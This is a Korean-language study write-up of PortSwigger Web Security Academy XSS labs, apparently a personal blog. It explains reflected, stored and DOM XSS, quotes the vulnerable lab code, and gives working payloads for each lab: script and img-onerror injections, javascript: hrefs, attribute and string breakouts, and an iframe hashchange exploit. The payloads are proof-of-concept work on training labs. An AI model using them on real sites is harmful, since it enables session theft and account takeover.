---
slug: "portswigger-xss"
title: "portswigger-XSS"
date: 2026-04-28
category: "웹 해킹"
section: "wargame"
tags: []
excerpt: "**현재까지 푼 문제: 6/30**"
readingTime: 13
---

**현재까지 푼 문제: 6/30**

##### JS 파일에서 봐야 할 키워드
```javascript
innerHTML      // 제일 흔함
outerHTML
document.write
eval()
setTimeout("문자열")   // 함수 아닌 문자열 인자
location.href
src =
```

#### 각 XSS 별 특징 

| 저장        | 피해 범위 | 실행 위치  |                            |
| --------- | ----- | ------ | -------------------------- |
| Reflected | X     | 나만     | 서버 응답 -> 서버가 HTML에 반영해서 응답 |
| Stored    | O     | 모든 방문자 | 서버 응답 및 적재                 |
| DOM       | X     | 나만     | js가 직접 dom에 쓰면서 클라이언트 JS   |
Reflected 
~~~
입력값이 서버로 가고 → 서버가 HTML에 반영해서 응답 → 브라우저가 실행
~~~
DOM 
~~~js
document.write(location.search) element.innerHTML = userInput
~~~
-> 이렇게 입력값을 직접 꽂아버리는 경우

		-> 위 두개 같은 경우엔 피싱 사이트 느낌으로 위험함

Stored 같은 경우엔 db에 저장되고 나중에 다른 사람 페이지에서 실행이 됨

---
# Reflected XSS into HTML context with nothing encoded

바로 입력창 보이자마자
~~~javascript
<script>alert("hacked!")</script>
~~~
갈기고 성공

---
# Stored XSS into HTML context with nothing encoded

~~~html
<form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
<input required="" type="hidden" name="csrf"value="zRxJ6DQpEAS4ZJisPvpqVbDz4YmbfZt7">

<input required="" type="hidden" name="postId" value="4">

<textarea required="" rows="12" cols="300" name="comment"></textarea>

<input required="" type="text" name="name">

<input required="" type="email" name="email">

<input pattern="(http:|https:).+" type="text" name="website">
<button class="button" type="submit">Post Comment</button>
                        </form>
~~~
얘도 걍 요구되는 형식만 다 맞춰주고 post 형식이니까 우선은 get 방식으로는 불가능함 ㅇㅇ
required를 확인하고 형식 맞춰주는 문제인듯함

**페이로드:**
~~~javascript
<script>alert("hacked!")</script>
~~~

---
# DOM XSS in `document.write` sink using source `location.search`

document.write 같은 경우엔 브라우저가 **HTML 문서를 파싱하는 도중** 그 스트림에 직접 끼워넣음 따라서 문서 파싱 단계에서 태그들을 끼워 넣으면 그걸 읽어벌임

검색창에다가 뭐 치면 아래같은 코드가 나옴
~~~javascript  
function trackSearch(query){
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">'); }
	var query = (new URLSearchParams(window.location.search)).get('search');
	if(query) { trackSearch(query);
}
~~~
-> 코드 잘보면 쿼리를 저런 식으로 추가하고 있음 근데 알다싶이 img는 xss 실행가능한 놈임 그래서 그냥 아래처럼 하면 됨

**페이로드:**
~~~
/?search=x"><script>alert("hacked!")</script>
~~~
아래처럼 해주면 어차피 html 이니까 뒤에 뭐 주석처리 이런거 안해도 알아서 텍스트로 나올거임.

---
# DOM XSS in `innerHTML` sink using source `location.search`

innerHtml은 태그를 텍스트로 받아들이지 않고 태그를 html 태그로 받아들임 이게 문제가 
~~~html
<div style="color:yellow; background-color:black">앙 기무찌</div>
~~~
-> 이딴 쓰레기 같은거 마저 곧이곧대로 받아들임

**페이로드**
~~~html
<img src=1 onerror=alert("hacked!");>
~~~

---
# DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

아 'submit feedback'의 파라미터를 보니까
~~~
.web-security-academy.net/feedback?returnPath=/
~~~
 이전 페이지를 url에 기억하고 있다가 실행함
 
 jQuery 쪽 코드를 보면 다음과 같은게 있음
~~~javascript
<a id="backLink" href="/">Back</a>

$(function() { $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath')); });
~~~
 보면 기존 페이지를 기억해놨다가 해당 back을 누르해당 href에 있는 곳으로 이동하게 돼 있음

~~~
/feedback?returnPath=javascript:alert(document.cookie)
~~~
 기존 파라미터를 다음과 같이 수정하고 return을 눌러보면 성공!

---
# DOM XSS in jQuery selector sink using a hashchange event

~~~javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
~~~
**문제점**: URL의 `#` 뒷부분을 그대로 jQuery 셀렉터에 이어붙임 → jQuery 구버전은 셀렉터 안에 HTML 태그를 넣으면 DOM에 직접 삽입해버림

**여기서 # 란? **
~~~
https://example.com/page?search=hello#section2
  |          |        |       |           |
스킴       도메인    경로   쿼리스트링   hash(fragment)
~~~
-> 요런 느낌이고 해당 페이지의 특정 부분으로 뿅하고 이동하는 애임

**공격 흐름**
```
URL hash 입력
    ↓
decodeURIComponent() 디코딩
    ↓
jQuery $() 셀렉터에 이어붙임
    ↓
HTML로 인식 → DOM 삽입
    ↓
onerror 이벤트 발동 → print() 실행
```

**왜 iframe이 필요한가**
`hashchange` 이벤트는 hash가 **바뀔 때**만 발동됨.
피해자한테 URL을 직접 보내면 처음 로드 시엔 이벤트가 안 터짐 → iframe으로 강제로 hash를 바꿔줘
야함

**Exploit 코드**
exploit 서버 Body에 입력:
html
```html
<iframe 
  src="https://랩URL/#" 
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

**동작 순서**:
1. iframe이 `랩URL/#` 로 로드됨
2. 로드 완료 → `onload` 발동
3. src 뒤에 payload 추가 → hash가 바뀜
4. `hashchange` 이벤트 발동
5. jQuery가 `<img src=x onerror=print()>` 를 DOM에 삽입
6. 존재하지 않는 이미지 로드 실패 → `onerror` 발동 → **`print()` 실행**

**풀이 순서**
1. exploit 서버 접속
2. Body에 위 코드 입력 (랩 URL로 수정)
3. Store 클릭
4. View exploit → 내 브라우저에서 print 창 뜨는지 확인
5. Deliver to victim 클릭 → 랩 클리어

---
# Reflected XSS into attribute with angle brackets HTML-encoded

검색창 쪽은 뭔가 필터링이 걸린듯함 
~~~html
<input type="text" placeholder="Search the blog..." name="search" value="">
<!-- 이게 검색창인데 -->
<script>alert("1")</script>
<!-- 이걸 입력하면 -->
<input type="text" placeholder="Search the blog..." name="search" value="&lt;script&gt;alert(" 1")&lt;="" script&gt;"="">
<!-- 이렇게 출력됨 -->
~~~
**문제점:**  큰꺽쇠 <, >  이 두개를 필터링 중인듯 함 근데 보면 "" 이건 필터링 안시킴 

#### 주요 개념 : autofocus / onfocus
**`autofocus`** = 페이지 로드되자마자 자동으로 해당 input에 포커스 이동시키는 HTML 속성
**`onfocus`** = 포커스가 생겼을 때 실행되는 이벤트 핸들러

익스플로잇
~~~
검색창에 value를 닫도록 " 하나 먼저 입력
		↓
autofocus onfocus=alert(1) x="
		↓
최종 페이로드: " autofocus onfocus=alert(1) x="
~~~

---
# Stored XSS into anchor `href` attribute with double quotes HTML-encoded

블로그에 a태그가 하나 걸려있는데 이걸 입력했을때 해당 페이지로 리다이렉션 시킴
~~~html
<p>
	<img src="/resources/images/avatarDefault.svg" class="avatar">
	<a> id="author" href="https://google.com">kenny</a> | 27 April 2026
</p>
~~~
그래서 아래와 같이 입력해봤더니 " " 가 필터링 됨
`" javascript:alert(1); x="`
~~~html
<a id="author" href="&quot; javascript:alert(1); x=&quot;">kenny</a>
~~~
아 난 바보 멍청이였음
`javascript : `
이건 원래 href 안에서 쓰는거였어 ㅠㅠ

익스플로잇:
~~~
javascript : alert(1);
		↓
결과: <a id="author" href="javascript:alert(1);">sfsaa</a>
~~~

---
# Reflected XSS into a JavaScript string with angle brackets HTML encoded

검색창에 뭔가를 입력하면 다음과 같이 나옴
~~~html
<script>
     var searchTerms = 'gdgd';
     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
~~~
**문제점:** 맨위에 보다싶이 document.write 가 있다면 일단 의심을 해보면 좋음

encodeURIComponent -> 특수 문자를 인코딩해주는 함수임
`" onerror=alert(1);`
이걸 입력해주면 아래와 같이 나옴
~~~html
<img src="/resources/images/tracker.gif searchTerms=%22%20onerror%3Dalert(1)%3B">
~~~
encodeURIComponent의 필터링을 하지 않는 범위는 아래와 같음
~~~
`A-Z`, `a-z`, `0-9`, `-`, `_`, `.`, `!`, `~`, `*`, `'`, `(`, `)`
~~~
-> 싱글쿼트 필터링이 안돼 있음

JS 문자열이 `'`로 감싸져 있는데 `'` 필터링이 안 돼서, 입력값으로 문자열을 조기에 닫을 수 있음

위에 코드 보면 입력받은 문자열을 그대로 `searchTerms` 에다가 넣고 있음 이런건  `'` (single quote)로 이스케이프가 가능

**익스플로잇:** 
~~~
'; alert(1);//
~~~
-> 주석으로 뒤에 있는 애들 치워줌

---
